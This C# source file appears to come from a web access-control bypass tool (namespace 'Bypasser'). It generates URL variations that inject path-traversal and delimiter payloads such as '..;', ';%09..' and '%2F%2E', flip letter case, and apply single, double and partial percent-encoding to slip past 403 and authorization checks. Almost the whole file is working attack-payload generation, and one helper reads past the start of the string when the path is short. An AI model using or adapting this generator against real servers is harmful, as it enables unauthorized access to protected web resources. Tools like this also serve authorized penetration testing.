namespace Bypasser
{
    public static class PayloadGenerator
    {
        private static readonly List<string> _payloads = new List<string>()
        {
            "%09",
            "%20",
            "%23",
            "%2e",
            "%2f",
            ".",
            ";",
            "..;",
            ";%09",
            ";%09..",
            ";%09..;",
            ";%2f..",
            "*",
            "%2E%2E%3B",
            "/.",
            "%2F%2E"
        };

        private static string _paylod_first = "..;";
        private static string _paylod_first_encoded = "%2E%2E%3B";
        private static string _payload_second = "/.";
        private static string _payload_second_encoded = "%2F%2E";

        /// <summary>
        /// Injects payloads in the path for path traversal
        /// </summary>
        /// <param name="path">Request path</param>
        /// <returns>Collection of path variations injected with payloads</returns>
        public static IEnumerable<string> PathTraversal(string path)
        {
            List<string> variations = new List<string>();

            var indexes = FindAllCharIndexes(path, '/');

            // before slashes
            foreach (var i in indexes)
            {
                foreach (var payload in _payloads)
                {
                    variations.Add(path.Insert(i, payload));
                }
            }

            // after slashes
            foreach (var i in indexes)
            {
                foreach (var payload in _payloads)
                {
                    variations.Add(path.Substring(0, i + 1) + payload + path.Substring(i + 1));
                }
            }

            // between slashes
            foreach (var i in indexes)
            {
                foreach (var payload in _payloads)
                {
                    variations.Add(path.Substring(0, i + 1) + payload + "/" + path.Substring(i + 1));
                }
            }

            // at the end of url
            foreach (var payload in _payloads)
            {
                variations.Add(path + "/" + payload);
                variations.Add(path + "/" + payload + "/");
            }

            return variations;
        }

        /// <summary>
        /// Transform the given URL in different variations with a ..; payload.
        /// </summary>
        /// <param name="url">Full url to a resource</param>
        /// <returns>Transformed variations of the url</returns>
        public static IEnumerable<string> Payload(string requestUrl)
        {
            List<string> variations = new List<string>();

            var uri = new Uri(requestUrl);
            var path = uri.PathAndQuery;

            for (int i = 0; i < path.Length; i++)
            {
                if (path[i] == '/')
                {
                    // first payload
                    variations.Add(requestUrl.Replace(path, "/" + path.Insert(i, _paylod_first)));
                    variations.Add(requestUrl.Replace(path, "/" + path.Insert(i, _paylod_first_encoded)));

                    variations.Add(requestUrl.Replace(path, "/" + path.Insert(i, _paylod_first)));
                    variations.Add(requestUrl.Replace(path, "/" + path.Insert(i, _paylod_first_encoded)));

                    variations.Add(requestUrl.Replace(path, path.Insert(i + 1, _paylod_first)));
                    variations.Add(requestUrl.Replace(path, path.Insert(i + 1, _paylod_first_encoded)));

                    // second payload
                    variations.Add(requestUrl.Replace(path, "/" + path.Insert(i, _payload_second)));
                    variations.Add(requestUrl.Replace(path, "/" + path.Insert(i, _payload_second_encoded)));

                    variations.Add(requestUrl.Replace(path, "/" + path.Insert(i, _payload_second)));
                    variations.Add(requestUrl.Replace(path, "/" + path.Insert(i, _payload_second_encoded)));
                }
            }

            variations.Add(requestUrl + "/");
            variations.Add(requestUrl + "..;/");

            return variations;
        }

        /// <summary>
        /// Transform the given URL with different upper and lower case variations
        /// </summary>
        /// <param name="url">Full url to a resource</param>
        /// <returns>Transformed variations of the url</returns>
        public static IEnumerable<string> WordCase(string path)
        {
            List<string> variations = new List<string>();

            variations.Add(path.ToLower());
            variations.Add(path.ToUpper());
            variations.Add(CapitalizeEachWord(path));
            variations.Add(ToggleCase(path));

            return variations;
        }

        /// <summary>
        /// Capitalize the first character of every word in the request path.
        /// </summary>
        /// <param name="path">Request path</param>
        /// <returns>Capitalized version of the path</returns>
        private static string CapitalizeEachWord(string path)
        {
            return string.Join("/", path.Split('/').Select(word =>
                word.Length > 0 ? char.ToUpper(word[0]) + word.Substring(1).ToLower() : word));
        }

        /// <summary>
        /// Toggles the case of each character in the request path.
        /// </summary>
        /// <param name="path"></param>
        /// <returns></returns>
        private static string ToggleCase(string path)
        {
            return string.Concat(path.Select(ch =>
                char.IsLetter(ch) ? (char.IsUpper(ch) ? char.ToLower(ch) : char.ToUpper(ch)) : ch));
        }

        /// <summary>
        /// Transform the given URL in different variations with ASCII encoding.
        /// </summary>
        /// <param name="url">Full url to a resource</param>
        /// <returns>Transformed variations of the url</returns>
        public static IEnumerable<string> Encode(string path)
        {
            List<string> variations = new List<string>();

            variations.Add(EncodeChars(path, "/"));
            variations.Add(EncodeChars(path, "\\"));
            variations.Add(DoubleEncode(path, "/"));
            variations.Add(FullyEncodeLetters(path));
            variations.Add(FullyEncodeSpecialChars(path));
            variations.Add(PartialEncode(path));

            return variations;
        }

        // Finds all indexes of a given character in a string
        private static List<int> FindAllCharIndexes(string str, char ch)
        {
            List<int> indexes = new List<int>();

            for (int i = 0; i < str.Length; i++)
            {
                if (str[i] == ch)
                {
                    indexes.Add(i);
                }
            }

            return indexes;
        }

        // Encodes specific characters in the path
        private static string EncodeChars(string path, string charToEncode)
        {
            return path.Replace(charToEncode, Uri.EscapeDataString(charToEncode));
        }

        // Double encodes specific characters
        private static string DoubleEncode(string path, string charToEncode)
        {
            string encoded = Uri.EscapeDataString(charToEncode); // First encoding
            return path.Replace(charToEncode, Uri.EscapeDataString(encoded)); // Encode again
        }

        // Fully encodes letters in the path
        private static string FullyEncodeLetters(string path)
        {
            return string.Concat(path.Select(ch =>
                char.IsLetter(ch) ? $"%{((int)ch):X2}" : ch.ToString())); // Convert to ASCII hex
        }

        // Fully encodes special characters in the path
        private static string FullyEncodeSpecialChars(string path)
        {
            string specialCharacters = ":?#[]@!$&'()*+,;=.";

            return string.Concat(path.Select(ch =>
                specialCharacters.Contains(ch) ? $"%{((int)ch):X2}" : ch.ToString())); // Convert to ASCII hex
        }

        // Partially encode the path. Only the first letter after /
        private static string PartialEncode(string path)
        {
            string result = "/";

            for (int i = 1; i < path.Length; i++)
            {
                if (path[i - 1] == '/' || path[i - 2] == '/')
                {
                    result += $"%{((int)path[i]):X2}";
                }
                else
                {
                    result += path[i];
                }
            }

            return result;
        }
    }
}
